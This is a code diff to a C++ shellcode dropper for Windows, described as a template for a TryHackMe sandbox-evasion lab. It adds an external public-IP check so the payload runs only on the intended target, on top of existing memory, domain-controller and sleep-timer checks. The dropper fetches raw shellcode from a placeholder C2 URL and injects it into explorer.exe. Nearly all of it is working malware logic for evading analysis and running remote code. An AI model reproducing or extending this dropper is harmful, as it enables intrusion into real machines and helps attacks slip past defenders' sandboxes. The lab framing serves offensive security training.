@@ -2,7 +2,8 @@
 /   Simple Shellcode-dropper template for Windows x64 Architecture
 /   used in the THM Sandbox evasion Room. For educational purpose only.
 /
-/   TODO: implement common evasion techniques.
+/   TODO: implement common sandbox evasion techniques.
+/   ADDED: memory checker, Windows DC check, IP address checker, sleep timer.
 /
 ************************************************************************/
 #include <iostream>
@@ -12,6 +13,8 @@
 #include <string>
 #include <urlmon.h>
 #include <cstdio>
+#include <lm.h>
+#include <DsGetDC.h>
 #pragma comment(lib, "urlmon.lib")
 
 using namespace std;
@@ -20,9 +23,11 @@ using namespace std;
 const int SHELLCODE_SIZE = 510;
 // PID of Explorer.exe for use in OpenProcess() API call. Find this using Windows Task Manager or Process Explorer.
 const int EXPLORER_PID = 5780;
+// IP address of your target:
+const char* TARGET_IP = "10.10.119.64";
 
 bool memoryCheck() {
-    // Check memory size. Most sandboxes use low specs to limit the imact on the host system.
+    // Check memory size. Most sandboxes use low specs to limit the impact on the host system.
     MEMORYSTATUSEX statex;
     statex.dwLength = sizeof(statex);
     GlobalMemoryStatusEx(&statex);
@@ -45,11 +50,38 @@ bool isDomainController() {
     string dcNewName(ws.begin(), ws.end());
     cout << dcNewName;
     if (dcNewName.find("\\\\")) {
-        return FALSE;
-
+        return false;
     }
     else {
-        return TRUE;
+        return true;
+    }
+}
+
+bool checkIP() {
+    // Check if our dropper got shipped off to an offsite-sandbox...
+    // Let's find out this machine's IP by using ifconfig.me:
+    const char* websiteURL = "https://ifconfig.me/ip";
+    IStream* stream;
+    string s;
+    char buff[35];
+    unsigned long bytesRead;
+    // Get the public facing IP address:
+    URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);
+    while (true) {
+        stream->Read(buff, 35, &bytesRead);
+        if (0U == bytesRead) {
+            break;
+        }
+        s.append(buff, bytesRead);
+    }
+    // Compare the results:
+    if (s == TARGET_IP) {
+        // All looks good! We are running on the target.
+        return true;
+    }
+    else {
+        // we are running probably offsite in a sandbox!
+        return false;
     }
 }
 
@@ -63,8 +95,8 @@ int downloadAndExecute() {
     SIZE_T bytesOut;
     hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, EXPLORER_PID);
 
-    // Update the c2URL with your IP Address and the specific URI where your raw shellcode is stored.
-    const char* c2URL = "http://yourc2ip/shellcode.raw";
+    // Update the c2URL with your IP address and the specific URI where your raw shellcode is stored.
+    const char* c2URL = "http://yourc2server/shellcode.raw";
     
     IStream* stream;
     char buff[SHELLCODE_SIZE];
@@ -90,10 +122,10 @@ int downloadAndExecute() {
 
 int main() {
     // Try to sleep through sandbox...
-    sleep(300); // sleep_timer in seconds, arround 5 min. should be realistic tho...
+    sleep(300); // sleep_timer in seconds, about 5 min should be realistic tho...
     
     // Only drop and run our payload if we are not sandboxed (-anymore-)...
-    if ((memoryCheck() == true) and (isDomainController() == true)) {
+    if ((memoryCheck() == true) && (isDomainController() == true) && (checkIP() == true)) {
         downloadAndExecute();
     }
     else {
